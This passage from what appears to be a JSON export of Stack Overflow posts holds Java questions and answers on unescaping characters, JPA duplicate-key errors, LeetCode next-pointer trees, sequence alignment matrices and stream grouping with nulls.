}\r\n    }\r\n    return output;\r\n  }\r\n}\r\n```\r\nthere are too many cases i can not full coverage  \r\n\r\nmaybe some library can implement this or some better implement  ","title":"how to join split char to a escaped char","body":"<p>I hava a question about how to help join split char to a escaped char?<br />\nthere is a example<br />\n<strong>what i want is to join divide char to a escaped char</strong><br />\n<strong>the escape rule should follow the java escape rule</strong><br />\n<strong>Example Input</strong><br />\nchar[] input = {'\\', 'n', '\\', 't', 'w', 'n'};<br />\n<strong>Expect Output</strong><br />\nchar[] expectOutput = {'\\n', '\\t', 'w', 'n'};</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class Demo {\n\n  public static void main(String[] args) {\n    char[] input = {'\\\\', 'n', '\\\\', 't', 'w', 'n'};\n    char[] expect = {'\\n', '\\t', 'w', 'n'};\n    char[] output = simpleImpl(input);\n  }\n\n  private static char[] simpleImpl(char[] input) {\n    char[] output = new char[input.length];\n    char prev = '\\0';\n    int index = 0;\n    for (int i = 0; i &lt; input.length; i++) {\n      char ch = input[i];\n      if (ch == '\\\\') {\n        prev = ch;\n      }\n      //need to escape\n      else if (prev == '\\\\') {\n        if (ch == 'n') {\n          output[index++] = '\\n';\n        } else if (ch == 't') {\n          output[index++] = '\\t';\n        } else {\n          // there are too many case\n        }\n      }\n      //simple char\n      else {\n        output[index++] = ch;\n      }\n    }\n    return output;\n  }\n}\n</code></pre>\n<p>there are too many cases i can not full coverage</p>\n<p>maybe some library can implement this or some better implement</p>\n"},{"tags":["java","hibernate","jpa"],"answers":[{"tags":[],"owner":{"account_id":16290452,"reputation":489,"user_id":11764050,"display_name":"PaulD"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642491563,"creation_date":1642491563,"answer_id":70751833,"question_id":70748890,"body_markdown":"This does not work with your current relationship, I don&#39;t understand why you would want to add duplicates, but if you have to, then you&#39;d have to create a new entity for that. One example would be something like this:\r\n```java\r\n@Entity\r\npublic class ProductBatch {\r\n\r\n  @Id\r\n  private String id;\r\n\r\n  @OneToOne\r\n  private Product product;\r\n\r\n  private Integer count;\r\n\r\n  // getter &amp; setter\r\n}\r\n```\r\n\r\nand then you change your `Client` like this:\r\n```java\r\n@Entity\r\npublic class Client {\r\n\r\n    @Id\r\n    private String id;\r\n\r\n    @OneToMany\r\n    private List&lt;ProductBatch&gt; products;\r\n}\r\n```\r\n\r\nthis makes something like this possible for your `addNewProduct` function:\r\n```java\r\npublic Client addNewProduct(Client client, Product newProduct) {\r\n    List&lt;ProductBatch&gt; products = client.getProducts();\r\n    boolean exists = false;\r\n    for(ProductBatch product : products) {\r\n        if(product.getProduct().equals(newProduct)) {\r\n            product.setCount(product.getCount() + 1);\r\n            exists = true;\r\n        }\r\n    }\r\n    if(!exists) {\r\n        BatchProduct product = new BatchProduct();\r\n        product.setProduct(newProduct);\r\n        product.setCount(0);\r\n        products.add(product);\r\n    }\r\n    client.setProducts(products);\r\n    return clientRepository.save(client);\r\n}\r\n```","title":"JPA/Hibernate How to add duplicate values to a List&lt;&gt; with a @OneToMany mapping","body":"<p>This does not work with your current relationship, I don't understand why you would want to add duplicates, but if you have to, then you'd have to create a new entity for that. One example would be something like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Entity\npublic class ProductBatch {\n\n  @Id\n  private String id;\n\n  @OneToOne\n  private Product product;\n\n  private Integer count;\n\n  // getter &amp; setter\n}\n</code></pre>\n<p>and then you change your <code>Client</code> like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Entity\npublic class Client {\n\n    @Id\n    private String id;\n\n    @OneToMany\n    private List&lt;ProductBatch&gt; products;\n}\n</code></pre>\n<p>this makes something like this possible for your <code>addNewProduct</code> function:</p>\n<pre class=\"lang-java prettyprint-override\"><code>public Client addNewProduct(Client client, Product newProduct) {\n    List&lt;ProductBatch&gt; products = client.getProducts();\n    boolean exists = false;\n    for(ProductBatch product : products) {\n        if(product.getProduct().equals(newProduct)) {\n            product.setCount(product.getCount() + 1);\n            exists = true;\n        }\n    }\n    if(!exists) {\n        BatchProduct product = new BatchProduct();\n        product.setProduct(newProduct);\n        product.setCount(0);\n        products.add(product);\n    }\n    client.setProducts(products);\n    return clientRepository.save(client);\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10814530,"reputation":4195,"user_id":7954021,"display_name":"Renis1235"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642491762,"creation_date":1642491762,"answer_id":70751864,"question_id":70748890,"body_markdown":"That has nothing to do with JPA or Hibernate. A constraint is a Database constraint and it is right. If a Foreign Key is already part of the table, trying to add it again, violates this constraint. An ID is unique and it should stay that way. So adding duplicates (at least with the same ID) will not work.\r\n ","title":"JPA/Hibernate How to add duplicate values to a List&lt;&gt; with a @OneToMany mapping","body":"<p>That has nothing to do with JPA or Hibernate. A constraint is a Database constraint and it is right. If a Foreign Key is already part of the table, trying to add it again, violates this constraint. An ID is unique and it should stay that way. So adding duplicates (at least with the same ID) will not work.</p>\n"}],"owner":{"account_id":23768567,"reputation":192,"user_id":17782982,"display_name":"turbofood"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":670,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70751833,"answer_count":2,"score":0,"last_activity_date":1642491762,"creation_date":1642464387,"question_id":70748890,"body_markdown":"I am getting an error every time I try to add duplicate products to the Client class. \r\n```\r\norg.postgresql.util.PSQLException: ERROR: duplicate key value violates unique constraint &quot;uk_8opk6otadh2pkvi9bghguwp89&quot;\r\n  Detail: Key (products_id)=(500010) already exists.\r\n```\r\nMy entities\r\n```\r\n@Entity\r\npublic class Client {\r\n    @Id\r\n    private String id;\r\n\r\n    @OneToMany\r\n    private List&lt;Product&gt; products;\r\n}\r\n\r\n@Entity\r\npublic class Product {\r\n    @Id\r\n    private String id;\r\n\r\n    private Boolean foreign;\r\n    private Integer price;\r\n}\r\n```\r\n\r\nWhen I call `.save()` hibernate is trying to re-save an already existing Product. I believe this is due to the how it cascades things. \r\n\r\n```\r\npublic Client addNewProduct(Client client, Product newProduct) {\r\n    List&lt;Product&gt; products = client.getProducts();\r\n    products.add(newProduct);\r\n    client.setProducts(products);\r\n    return clientRepository.save(client);\r\n}\r\n```\r\n\r\nI just want to be able to add duplicates to a List&lt;&gt;. I believe this is &amp; should be a uni-directional relationship.","title":"JPA/Hibernate How to add duplicate values to a List&lt;&gt; with a @OneToMany mapping","body":"<p>I am getting an error every time I try to add duplicate products to the Client class.</p>\n<pre><code>org.postgresql.util.PSQLException: ERROR: duplicate key value violates unique constraint &quot;uk_8opk6otadh2pkvi9bghguwp89&quot;\n  Detail: Key (products_id)=(500010) already exists.\n</code></pre>\n<p>My entities</p>\n<pre><code>@Entity\npublic class Client {\n    @Id\n    private String id;\n\n    @OneToMany\n    private List&lt;Product&gt; products;\n}\n\n@Entity\npublic class Product {\n    @Id\n    private String id;\n\n    private Boolean foreign;\n    private Integer price;\n}\n</code></pre>\n<p>When I call <code>.save()</code> hibernate is trying to re-save an already existing Product. I believe this is due to the how it cascades things.</p>\n<pre><code>public Client addNewProduct(Client client, Product newProduct) {\n    List&lt;Product&gt; products = client.getProducts();\n    products.add(newProduct);\n    client.setProducts(products);\n    return clientRepository.save(client);\n}\n</code></pre>\n<p>I just want to be able to add duplicates to a List&lt;&gt;. I believe this is &amp; should be a uni-directional relationship.</p>\n"},{"tags":["java","pointers","nullpointerexception","binary-search-tree"],"comments":[{"owner":{"account_id":23685228,"reputation":1103,"user_id":17710270,"display_name":"passer-by"},"score":0,"creation_date":1642472723,"post_id":70749607,"comment_id":125074094,"body_markdown":"*I assign root.left.next to the root.right node,* - if you mean this: `root.left.next = root.right;` then it&#39;s assigning the root.right node to roor.left.next, the exact opposite of what you said.  Is this just a terminology problem or something more? `a = b`  means &quot;assign b to a&quot;.","body":"<i>I assign root.left.next to the root.right node,</i> - if you mean this: <code>root.left.next = root.right;</code> then it&#39;s assigning the root.right node to roor.left.next, the exact opposite of what you said.  Is this just a terminology problem or something more? <code>a = b</code>  means &quot;assign b to a&quot;."},{"owner":{"account_id":6126696,"reputation":15,"user_id":4778396,"display_name":"Hebazzz"},"score":0,"creation_date":1642473727,"post_id":70749607,"comment_id":125074241,"body_markdown":"You are right, I described it wrong","body":"You are right, I described it wrong"}],"answers":[{"tags":[],"owner":{"account_id":7142980,"reputation":323253,"user_id":5459839,"display_name":"trincot"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642490992,"creation_date":1642490992,"answer_id":70751727,"question_id":70749607,"body_markdown":"Let&#39;s look at the example tree:\r\n\r\n[![enter image description here][1]][1]\r\n\r\nYour code (i.e. the part you have shared) will establish all the red links, **except** the one between nodes 5 and 6, as those are not siblings! They are not the left/right children of the same `root` node. Or to describe that problem differently: your code will set the `next` property of **all** right-sided children to `null`. For nodes 3 and 7 that is the correct thing to do, but not for node 5. The higher the tree, the more nodes there are whose `next` property will not be set correctly.\r\n\r\nSo you&#39;ll need a different algorithm.\r\n\r\nHint: use a breadth-first traversal instead of the depth-first traversal that you have implemented.\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/BMsY8.png","title":"Populating Next Right Pointers - Why Node.next is still null when passed recursively?","body":"<p>Let's look at the example tree:</p>\n<p><a href=\"https://i.stack.imgur.com/BMsY8.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/BMsY8.png\" alt=\"enter image description here\" /></a></p>\n<p>Your code (i.e. the part you have shared) will establish all the red links, <strong>except</strong> the one between nodes 5 and 6, as those are not siblings! They are not the left/right children of the same <code>root</code> node. Or to describe that problem differently: your code will set the <code>next</code> property of <strong>all</strong> right-sided children to <code>null</code>. For nodes 3 and 7 that is the correct thing to do, but not for node 5. The higher the tree, the more nodes there are whose <code>next</code> property will not be set correctly.</p>\n<p>So you'll need a different algorithm.</p>\n<p>Hint: use a breadth-first traversal instead of the depth-first traversal that you have implemented.</p>\n"}],"owner":{"account_id":6126696,"reputation":15,"user_id":4778396,"display_name":"Hebazzz"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":89,"favorite_count":0,"down_vote_count":3,"up_vote_count":1,"answer_count":1,"score":-2,"last_activity_date":1642491585,"creation_date":1642472407,"question_id":70749607,"body_markdown":"I am working on Leet code question [116. Populating Next Right Pointers in Each Node](https://leetcode.com/problems/populating-next-right-pointers-in-each-node/):\r\n\r\n&gt; You are given a **perfect binary tree** where all leaves are on the same level, and every parent has two children. The binary tree has the following definition:\r\n&gt; \r\n&gt;     struct Node {\r\n&gt;       int val;\r\n&gt;       Node *left;\r\n&gt;       Node *right;\r\n&gt;       Node *next;\r\n&gt;     }\r\n&gt; \r\n&gt; Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to `NULL`.\r\n&gt; \r\n&gt; Initially, all next pointers are set to `NULL`.\r\n\r\nMy solution is wrong. My question is about this piece of my code:\r\n\r\n```\r\n    if(root.right==null){\r\n        return null;\r\n    }\r\n    root.left.next = root.right;\r\n\r\n    root.right.next=null;\r\n    connect(root.left);\r\n    connect(root.right);\r\n\r\n    return root;\r\n```\r\n\r\nI assign `root.right` to `root.left.next`, yet I find when `connect(root.left)` is passed, the `next` node is still `null`. How come there is still this `null`?\r\n\r\n\r\n","title":"Populating Next Right Pointers - Why Node.next is still null when passed recursively?","body":"<p>I am working on Leet code question <a href=\"https://leetcode.com/problems/populating-next-right-pointers-in-each-node/\" rel=\"nofollow noreferrer\">116. Populating Next Right Pointers in Each Node</a>:</p>\n<blockquote>\n<p>You are given a <strong>perfect binary tree</strong> where all leaves are on the same level, and every parent has two children. The binary tree has the following definition:</p>\n<pre><code>struct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n</code></pre>\n<p>Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to <code>NULL</code>.</p>\n<p>Initially, all next pointers are set to <code>NULL</code>.</p>\n</blockquote>\n<p>My solution is wrong. My question is about this piece of my code:</p>\n<pre><code>    if(root.right==null){\n        return null;\n    }\n    root.left.next = root.right;\n\n    root.right.next=null;\n    connect(root.left);\n    connect(root.right);\n\n    return root;\n</code></pre>\n<p>I assign <code>root.right</code> to <code>root.left.next</code>, yet I find when <code>connect(root.left)</code> is passed, the <code>next</code> node is still <code>null</code>. How come there is still this <code>null</code>?</p>\n"},{"tags":["java","arrays","matrix","dynamic-programming","sequence-alignment"],"answers":[{"tags":[],"owner":{"account_id":384206,"reputation":50386,"user_id":740553,"accept_rate":46,"display_name":"Mike &#39;Pomax&#39; Kamermans"},"down_vote_count":2,"up_vote_count":0,"is_accepted":false,"score":-2,"last_activity_date":1387328287,"creation_date":1387328287,"answer_id":20647776,"question_id":20647619,"body_markdown":"Have a look at http://en.wikipedia.org/wiki/Longest_common_substring, the code is pretty much copy-paste for several languages, and is easily adapted to also tell you the alignment index. I had to do a similar thing and ended up with https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L103\r\n\r\n(The SubsetMapping it returns is basically a simple struct that gives the index for both contexts, https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L52)","title":"global sequence alignment dynamic programming finding the minimum in a matrix","body":"<p>Have a look at <a href=\"http://en.wikipedia.org/wiki/Longest_common_substring\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Longest_common_substring</a>, the code is pretty much copy-paste for several languages, and is easily adapted to also tell you the alignment index. I had to do a similar thing and ended up with <a href=\"https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L103\" rel=\"nofollow\">https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L103</a></p>\n\n<p>(The SubsetMapping it returns is basically a simple struct that gives the index for both contexts, <a href=\"https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L52\" rel=\"nofollow\">https://github.com/Pomax/DOM-diff/blob/rewrite/rewrite/rewrite.html#L52</a>)</p>\n"},{"tags":[],"owner":{"account_id":1104392,"reputation":8418,"user_id":1096117,"accept_rate":75,"display_name":"Juli&#225;n Urbano"},"down_vote_count":0,"up_vote_count":4,"is_accepted":true,"score":4,"last_activity_date":1387331281,"creation_date":1387330546,"answer_id":20648143,"question_id":20647619,"body_markdown":"There are several things that you need to modify:\r\n\r\n 1. Note that in the image you give us the alignment goes from the bottom-right corner to the top-left corner. So in that image they are not really aligning `AACAGTTACC` and `TAAGGTCA`, but `CCATTGACAA` and `ACTGGAAT`.\r\n 2. You say that you want a [global alignment][1], but you actually compute a [local alignment][2]. The main difference is in penalties at the beginning of the sequences. In a global alignment you have to compute insertions and deletions at the first row and columns.\r\n 3. Third, you are not applying correctly the penalties you mention. Instead, you always penalize with -1 and reward with +1.\r\n 4. In the example image they are not taking the maximum value at each position, but the minimum (this is because your penalties are positive and the rewards is 0, not the other way around, so you want to minimize the values).\r\n\r\nThe full solution is:\r\n\r\n\t// Note that these sequences are reversed!\r\n\tString sequenceA =&quot;CCATTGACAA&quot;;\r\n\tString sequenceB = &quot;ACTGGAAT&quot;;\r\n\r\n\t// The penalties to apply\r\n\tint gap = 2, substitution = 1, match = 0;\r\n\r\n\tint[][] opt = new int[sequenceA.length() + 1][sequenceB.length() + 1];\r\n\r\n\t// First of all, compute insertions and deletions at 1st row/column\r\n\tfor (int i = 1; i &lt;= sequenceA.length(); i++)\r\n\t\topt[i][0] = opt[i - 1][0] + gap;\r\n\tfor (int j = 1; j &lt;= sequenceB.length(); j++)\r\n\t\topt[0][j] = opt[0][j - 1] + gap;\r\n\r\n\tfor (int i = 1; i &lt;= sequenceA.length(); i++) {\r\n\t\tfor (int j = 1; j &lt;= sequenceB.length(); j++) {\r\n\t\t\tint scoreDiag = opt[i - 1][j - 1] +\r\n\t\t\t\t\t(sequenceA.charAt(i-1) == sequenceB.charAt(j-1) ?\r\n\t\t\t\t\t    match : // same symbol\r\n\t\t\t\t\t    substitution); // different symbol\r\n\t\t\tint scoreLeft = opt[i][j - 1] + gap; // insertion\r\n\t\t\tint scoreUp = opt[i - 1][j] + gap; // deletion\r\n\t\t\t// we take the minimum\r\n\t\t\topt[i][j] = Math.min(Math.min(scoreDiag, scoreLeft), scoreUp);\r\n\t\t}\r\n\t}\r\n\r\n\tfor (int i = 0; i &lt;= sequenceA.length(); i++) {\r\n\t\tfor (int j = 0; j &lt;= sequenceB.length(); j++)\r\n\t\t\tSystem.out.print(opt[i][j] + &quot;\\t&quot;);\r\n\t\tSystem.out.println();\r\n\t}\r\n\r\nThe result is just as in the example you gave us (but reversed, remember!):\r\n\r\n    0\t2\t4\t6\t8\t10\t12\t14\t16\t\r\n    2\t1\t2\t4\t6\t8\t10\t12\t14\t\r\n    4\t3\t1\t3\t5\t7\t9\t11\t13\t\r\n    6\t4\t3\t2\t4\t6\t7\t9\t11\t\r\n    8\t6\t5\t3\t3\t5\t7\t8\t9\t\r\n    10\t8\t7\t5\t4\t4\t6\t8\t8\t\r\n    12\t10\t9\t7\t5\t4\t5\t7\t9\t\r\n    14\t12\t11\t9\t7\t6\t4\t5\t7\t\r\n    16\t14\t12\t11\t9\t8\t6\t5\t6\t\r\n    18\t16\t14\t13\t11\t10\t8\t6\t6\t\r\n    20\t18\t16\t15\t13\t12\t10\t8\t7\r\n\r\nSo the final alignment score is found at `opt[sequenceA.length()][sequenceB.length()]` (7). If you really need to show the reversed matrix as in the image, do this:\r\n\r\n\tfor (int i = sequenceA.length(); i &gt;=0; i--) {\r\n\t\tfor (int j = sequenceB.length(); j &gt;= 0 ; j--)\r\n\t\t\tSystem.out.print(opt[i][j] + &quot;\\t&quot;);\r\n\t\tSystem.out.println();\r\n\t}\r\n\r\n  [1]: http://en.wikipedia.org/wiki/Needleman-Wunsch_algorithm\r\n  [2]: http://en.wikipedia.org/wiki/Smith-Waterman_algorithm","title":"global sequence alignment dynamic programming finding the minimum in a matrix","body":"<p>There are several things that you need to modify:</p>\n\n<ol>\n<li>Note that in the image you give us the alignment goes from the bottom-right corner to the top-left corner. So in that image they are not really aligning <code>AACAGTTACC</code> and <code>TAAGGTCA</code>, but <code>CCATTGACAA</code> and <code>ACTGGAAT</code>.</li>\n<li>You say that you want a <a href=\"http://en.wikipedia.org/wiki/Needleman-Wunsch_algorithm\" rel=\"nofollow\">global alignment</a>, but you actually compute a <a href=\"http://en.wikipedia.org/wiki/Smith-Waterman_algorithm\" rel=\"nofollow\">local alignment</a>. The main difference is in penalties at the beginning of the sequences. In a global alignment you have to compute insertions and deletions at the first row and columns.</li>\n<li>Third, you are not applying correctly the penalties you mention. Instead, you always penalize with -1 and reward with +1.</li>\n<li>In the example image they are not taking the maximum value at each position, but the minimum (this is because your penalties are positive and the rewards is 0, not the other way around, so you want to minimize the values).</li>\n</ol>\n\n<p>The full solution is:</p>\n\n<pre><code>// Note that these sequences are reversed!\nString sequenceA =\"CCATTGACAA\";\nString sequenceB = \"ACTGGAAT\";\n\n// The penalties to apply\nint gap = 2, substitution = 1, match = 0;\n\nint[][] opt = new int[sequenceA.length() + 1][sequenceB.length() + 1];\n\n// First of all, compute insertions and deletions at 1st row/column\nfor (int i = 1; i &lt;= sequenceA.length(); i++)\n    opt[i][0] = opt[i - 1][0] + gap;\nfor (int j = 1; j &lt;= sequenceB.length(); j++)\n    opt[0][j] = opt[0][j - 1] + gap;\n\nfor (int i = 1; i &lt;= sequenceA.length(); i++) {\n    for (int j = 1; j &lt;= sequenceB.length(); j++) {\n        int scoreDiag = opt[i - 1][j - 1] +\n                (sequenceA.charAt(i-1) == sequenceB.charAt(j-1) ?\n                    match : // same symbol\n                    substitution); // different symbol\n        int scoreLeft = opt[i][j - 1] + gap; // insertion\n        int scoreUp = opt[i - 1][j] + gap; // deletion\n        // we take the minimum\n        opt[i][j] = Math.min(Math.min(scoreDiag, scoreLeft), scoreUp);\n    }\n}\n\nfor (int i = 0; i &lt;= sequenceA.length(); i++) {\n    for (int j = 0; j &lt;= sequenceB.length(); j++)\n        System.out.print(opt[i][j] + \"\\t\");\n    System.out.println();\n}\n</code></pre>\n\n<p>The result is just as in the example you gave us (but reversed, remember!):</p>\n\n<pre><code>0   2   4   6   8   10  12  14  16  \n2   1   2   4   6   8   10  12  14  \n4   3   1   3   5   7   9   11  13  \n6   4   3   2   4   6   7   9   11  \n8   6   5   3   3   5   7   8   9   \n10  8   7   5   4   4   6   8   8   \n12  10  9   7   5   4   5   7   9   \n14  12  11  9   7   6   4   5   7   \n16  14  12  11  9   8   6   5   6   \n18  16  14  13  11  10  8   6   6   \n20  18  16  15  13  12  10  8   7\n</code></pre>\n\n<p>So the final alignment score is found at <code>opt[sequenceA.length()][sequenceB.length()]</code> (7). If you really need to show the reversed matrix as in the image, do this:</p>\n\n<pre><code>for (int i = sequenceA.length(); i &gt;=0; i--) {\n    for (int j = sequenceB.length(); j &gt;= 0 ; j--)\n        System.out.print(opt[i][j] + \"\\t\");\n    System.out.println();\n}\n</code></pre>\n"}],"owner":{"account_id":3019624,"reputation":195,"user_id":2560965,"accept_rate":75,"display_name":"judge"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":9579,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"accepted_answer_id":20648143,"answer_count":2,"score":4,"last_activity_date":1642491531,"creation_date":1387327279,"question_id":20647619,"body_markdown":"I have 2 sequences, `AACAGTTACC` and `TAAGGTCA`, and I&#39;m trying to find a global sequence alignment. I managed to create a 2D array and create the matrix, and I even filled it with semi-dynamic approach.\r\n\r\nHere is my code to fill the matrix:\r\n\r\n    void process() {\r\n        for (int i = 1; i &lt;= sequenceA.length; i++) {\r\n            for (int j = 1; j &lt;= sequenceB.length; j++) {\r\n                int scoreDiag = opt[i-1][j-1] + equal(i, j);\r\n                int scoreLeft = opt[i][j-1] - 1;\r\n                int scoreUp = opt[i-1][j] - 1;\r\n                opt[i][j] = Math.max(Math.max(scoreDiag, scoreLeft), scoreUp);\r\n            }\r\n        }\r\n    }\r\n\r\n    private int equal(int i, int j) {\r\n        if (sequenceA[i - 1] == sequenceB[j - 1]) {\r\n            return 1;\r\n        } else {\r\n            return -1;\r\n        }\r\n    }\r\n\r\nMy main problem is that this code generates this output: \r\n\r\n     0   -1   -2   -3   -4   -5   -6   -7   -8     \r\n    -1   -1    0   -1   -2   -3   -4   -5   -6      \r\n    -2   -2    0    1    0   -1   -2   -3   -4     \r\n     -3   -3   -1    0    0   -1   -2   -1   -2      \r\n     -4   -4   -2    0   -1   -1   -2   -2    0      \r\n     -5   -5   -3   -1    1    0   -1   -2   -1       \r\n    -6   -4   -4   -2    0    0    1    0   -1      \r\n    -7   -5   -5   -3   -1   -1    1    0   -1       \r\n    -8   -6   -4   -4   -2   -2    0    0    1      \r\n     -9   -7   -5   -5   -3   -3   -1    1    0      \r\n    -10   -8   -6   -6   -4   -4   -2    0    0 \r\n\r\nBut I want it to look like this (all i care are numbers in the pictures):\r\n\r\n![enter image description here][1]\r\n\r\nI got to apply penaltys: per mismatch 1 and per gap 2, if its match 0.\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/ViHc9.png","title":"global sequence alignment dynamic programming finding the minimum in a matrix","body":"<p>I have 2 sequences, <code>AACAGTTACC</code> and <code>TAAGGTCA</code>, and I'm trying to find a global sequence alignment. I managed to create a 2D array and create the matrix, and I even filled it with semi-dynamic approach.</p>\n\n<p>Here is my code to fill the matrix:</p>\n\n<pre><code>void process() {\n    for (int i = 1; i &lt;= sequenceA.length; i++) {\n        for (int j = 1; j &lt;= sequenceB.length; j++) {\n            int scoreDiag = opt[i-1][j-1] + equal(i, j);\n            int scoreLeft = opt[i][j-1] - 1;\n            int scoreUp = opt[i-1][j] - 1;\n            opt[i][j] = Math.max(Math.max(scoreDiag, scoreLeft), scoreUp);\n        }\n    }\n}\n\nprivate int equal(int i, int j) {\n    if (sequenceA[i - 1] == sequenceB[j - 1]) {\n        return 1;\n    } else {\n        return -1;\n    }\n}\n</code></pre>\n\n<p>My main problem is that this code generates this output: </p>\n\n<pre><code> 0   -1   -2   -3   -4   -5   -6   -7   -8     \n-1   -1    0   -1   -2   -3   -4   -5   -6      \n-2   -2    0    1    0   -1   -2   -3   -4     \n -3   -3   -1    0    0   -1   -2   -1   -2      \n -4   -4   -2    0   -1   -1   -2   -2    0      \n -5   -5   -3   -1    1    0   -1   -2   -1       \n-6   -4   -4   -2    0    0    1    0   -1      \n-7   -5   -5   -3   -1   -1    1    0   -1       \n-8   -6   -4   -4   -2   -2    0    0    1      \n -9   -7   -5   -5   -3   -3   -1    1    0      \n-10   -8   -6   -6   -4   -4   -2    0    0 \n</code></pre>\n\n<p>But I want it to look like this (all i care are numbers in the pictures):</p>\n\n<p><img src=\"https://i.stack.imgur.com/ViHc9.png\" alt=\"enter image description here\"></p>\n\n<p>I got to apply penaltys: per mismatch 1 and per gap 2, if its match 0.</p>\n"},{"tags":["java","java-stream"],"comments":[{"owner":{"account_id":3580374,"reputation":108855,"user_id":2988730,"accept_rate":96,"display_name":"Mad Physicist"},"score":0,"creation_date":1642490750,"post_id":70751651,"comment_id":125077370,"body_markdown":"Please see [mcve] and fix your question accordingly.","body":"Please see <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> and fix your question accordingly."},{"owner":{"account_id":1691630,"reputation":49583,"user_id":1553851,"accept_rate":73,"display_name":"shmosel"},"score":0,"creation_date":1642490990,"post_id":70751651,"comment_id":125077447,"body_markdown":"I don&#39;t understand the output. Why is nothing mapped to banana?","body":"I don&#39;t understand the output. Why is nothing mapped to banana?"},{"owner":{"account_id":23973554,"reputation":9,"user_id":17961915,"display_name":"RiKh"},"score":0,"creation_date":1642491087,"post_id":70751651,"comment_id":125077489,"body_markdown":"@shmosel updated the output","body":"@shmosel updated the output"},{"owner":{"account_id":1263831,"reputation":388998,"user_id":1221571,"accept_rate":67,"display_name":"Eran"},"score":0,"creation_date":1642491273,"post_id":70751651,"comment_id":125077542,"body_markdown":"What do you want to do with `list.add(DummyClass(null,&quot;apple&quot;))`? Ignore it or map `null` to &quot;apple&quot;?","body":"What do you want to do with <code>list.add(DummyClass(null,&quot;apple&quot;))</code>? Ignore it or map <code>null</code> to &quot;apple&quot;?"},{"owner":{"account_id":23973554,"reputation":9,"user_id":17961915,"display_name":"RiKh"},"score":0,"creation_date":1642491303,"post_id":70751651,"comment_id":125077547,"body_markdown":"@Eran ignore if list is null","body":"@Eran ignore if list is null"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1642510432,"post_id":70751651,"comment_id":125085071,"body_markdown":"Since you are grouping by a `List&lt;String&gt;` key, the resulting map is a `Map&lt;List&lt;String&gt;, Set&lt;String&gt;&gt;`, not a `Map&lt;String, Set&lt;String&gt;&gt;`.","body":"Since you are grouping by a <code>List&lt;String&gt;</code> key, the resulting map is a <code>Map&lt;List&lt;String&gt;, Set&lt;String&gt;&gt;</code>, not a <code>Map&lt;String, Set&lt;String&gt;&gt;</code>."}],"answers":[{"tags":[],"owner":{"account_id":172182,"reputation":4913,"user_id":400048,"accept_rate":96,"display_name":"zcourts"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642491403,"creation_date":1642491403,"answer_id":70751806,"question_id":70751651,"body_markdown":"You need to do a filter - many of the util classes to construct collections no longer allow null e.g. `Map.of` or the `groupingBy` you have above.\r\nYou can filter or first map, replace null with a string and then group by.\r\n\r\n    Map&lt;String, Set&lt;String&gt;&gt; map =\r\n    list.stream().filter(v-&gt; v.getName() != null)\r\n                 .collect(Collectors.groupingBy(DummyClass::rname, \r\n                                                Collectors.mapping(DummyClass::getName,\r\n                                                                   Collectors.toSet())));\r\n\r\nOr if you don&#39;t want to drop null values, do a map and produce a key that all null names can be grouped under something like:\r\n\r\n    Map&lt;String, Set&lt;String&gt;&gt; map =\r\n    list.stream().map(v-&gt; Map.entry(v.getName() == null? &quot;null&quot;: v.getName(), v))\r\n                 .collect(Collectors.groupingBy(Map.Entry::getKey, \r\n                                                Collectors.mapping(Map.Entry::getKey,\r\n                                                                   Collectors.toSet())));\r\n\r\n\r\nThe `groupingBy` that I have above needs to be changed as it now has a `Map.Entry` rather than your desired type. \r\n\r\nI&#39;m writing this on a mobile...without an editor so will leave that part to you :)","title":"Java 8 Need advice with stream","body":"<p>You need to do a filter - many of the util classes to construct collections no longer allow null e.g. <code>Map.of</code> or the <code>groupingBy</code> you have above.\nYou can filter or first map, replace null with a string and then group by.</p>\n<pre><code>Map&lt;String, Set&lt;String&gt;&gt; map =\nlist.stream().filter(v-&gt; v.getName() != null)\n             .collect(Collectors.groupingBy(DummyClass::rname, \n                                            Collectors.mapping(DummyClass::getName,\n                                                               Collectors.toSet())));\n</code></pre>\n<p>Or if you don't want to drop null values, do a map and produce a key that all null names can be grouped under something like:</p>\n<pre><code>Map&lt;String, Set&lt;String&gt;&gt; map =\nlist.stream().map(v-&gt; Map.entry(v.getName() == null? &quot;null&quot;: v.getName(), v))\n             .collect(Collectors.groupingBy(Map.Entry::getKey, \n                                            Collectors.mapping(Map.Entry::getKey,\n                                                               Collectors.toSet())));\n</code></pre>\n<p>The <code>groupingBy</code> that I have above needs to be changed as it now has a <code>Map.Entry</code> rather than your desired type.</p>\n<p>I'm writing this on a mobile...without an editor so will leave that part to you 